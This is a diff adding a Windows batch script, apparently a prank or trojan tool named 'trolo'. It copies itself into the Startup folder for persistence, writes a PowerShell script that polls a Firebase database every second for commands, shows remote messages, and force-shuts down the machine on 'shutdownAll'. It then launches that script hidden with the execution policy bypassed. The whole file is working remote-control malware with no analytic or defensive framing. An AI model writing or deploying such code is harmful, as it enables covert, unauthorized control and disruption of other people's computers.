@@ -1,0 +1,64 @@
+@echo off
+setlocal
+
+:: Define paths for the folder and PowerShell script
+set "folderPath=%APPDATA%\TroloFolder"
+set "ps1File=%folderPath%\trolo.ps1"
+
+:: Ensure the folder exists
+if not exist "%folderPath%" (
+    mkdir "%folderPath%"
+)
+
+:: Copy this batch script to Startup folder for persistence
+copy "%~f0" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+
+:: Generate the PowerShell script dynamically
+echo $firebaseUrl = "https://trolo-1252e-default-rtdb.firebaseio.com/main.json" > "%ps1File%"
+echo function Check-WiFi { >> "%ps1File%"
+echo     $networkAdapters = Get-NetAdapter >> "%ps1File%"
+echo     foreach ($adapter in $networkAdapters) { >> "%ps1File%"
+echo         if ($adapter.Status -eq "Up") { >> "%ps1File%"
+echo             return $true >> "%ps1File%"
+echo         } >> "%ps1File%"
+echo     } >> "%ps1File%"
+echo     return $false >> "%ps1File%"
+echo } >> "%ps1File%"
+echo while ($true) { >> "%ps1File%"
+echo     try { >> "%ps1File%"
+echo         if (Check-WiFi) { >> "%ps1File%"
+echo             Write-Host "Wi-Fi is connected. Checking Firebase..." >> "%ps1File%"
+echo             $response = Invoke-RestMethod -Uri $firebaseUrl -Method Get >> "%ps1File%"
+echo             Write-Host "Response from Firebase: $($response | ConvertTo-Json -Depth 1)" >> "%ps1File%"
+echo             if ($response.PSObject.Properties.Match("message")) { >> "%ps1File%"
+echo                 $message = $response.message >> "%ps1File%"
+echo                 if ([string]::IsNullOrWhiteSpace($message)) { >> "%ps1File%"
+echo                     Write-Host "No actionable message found." >> "%ps1File%"
+echo                 } elseif ($message -eq "shutdownAll") { >> "%ps1File%"
+echo                     Write-Host "Shutdown command received. Shutting down..." >> "%ps1File%"
+echo                     $emptyPayload = @{ message = "" } ^| ConvertTo-Json -Depth 1 >> "%ps1File%"
+echo                     Invoke-RestMethod -Uri $firebaseUrl -Method Patch -Body $emptyPayload -ContentType "application/json" >> "%ps1File%"
+echo                     shutdown.exe /s /f /t 0 >> "%ps1File%"
+echo                 } else { >> "%ps1File%"
+echo                     Write-Host "Displaying message: $message" >> "%ps1File%"
+echo                     Add-Type -AssemblyName PresentationFramework >> "%ps1File%"
+echo                     [System.Windows.MessageBox]::Show($message, "Message", 0, "Information") >> "%ps1File%"
+echo                     $emptyPayload = @{ message = "" } ^| ConvertTo-Json -Depth 1 >> "%ps1File%"
+echo                     Invoke-RestMethod -Uri $firebaseUrl -Method Patch -Body $emptyPayload -ContentType "application/json" >> "%ps1File%"
+echo                 } >> "%ps1File%"
+echo             } else { >> "%ps1File%"
+echo                 Write-Host "No 'message' field found in the Firebase response." >> "%ps1File%"
+echo             } >> "%ps1File%"
+echo         } else { >> "%ps1File%"
+echo             Write-Host "Wi-Fi is not connected. Retrying..." >> "%ps1File%"
+echo         } >> "%ps1File%"
+echo     } catch { >> "%ps1File%"
+echo         Write-Host "Error occurred: $_" >> "%ps1File%"
+echo     } >> "%ps1File%"
+echo     Start-Sleep -Seconds 1 >> "%ps1File%"
+echo } >> "%ps1File%"
+
+:: Run the PowerShell script hidden
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \"%ps1File%\"' -WindowStyle Hidden"
+
+endlocal
